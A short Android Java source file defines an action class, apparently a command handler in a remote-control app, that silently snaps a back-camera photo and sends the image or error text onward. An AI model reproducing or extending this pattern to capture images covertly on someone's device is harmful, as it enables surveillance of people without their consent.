package com.lfish.control.action.actiondomian;


import android.hardware.Camera;
import android.os.Build;

import com.lfish.control.Config;
import com.lfish.control.action.BaseBeanAction;
import com.lfish.control.action.actiontool.CameraSnapshot;

public class TackPhoto_BackAction extends BaseBeanAction {

	@Override
	public void run() {
		// TODO Auto-generated method stub

		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
			
			CameraSnapshot camera = CameraSnapshot.self();
			synchronized(Config.lock) {
//				if(cameraid.equals(Cmdfilter.FILTER_KEY_Front))
				camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK,new CameraSnapshot.CameraSnapCallBack() {
					
					@Override
					public void onSuccess(String path) {
						// TODO Auto-generated method stub
						sendImageMessage(path);
					}

					@Override
					public void onFailed(String msg) {
						// TODO Auto-generated method stub
						sendTxt(msg);
					} 
				});
//				else if(cameraid.equals(Cmdfilter.FILTER_KEY_Back))
//					camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
			}
		
		}
	}

}
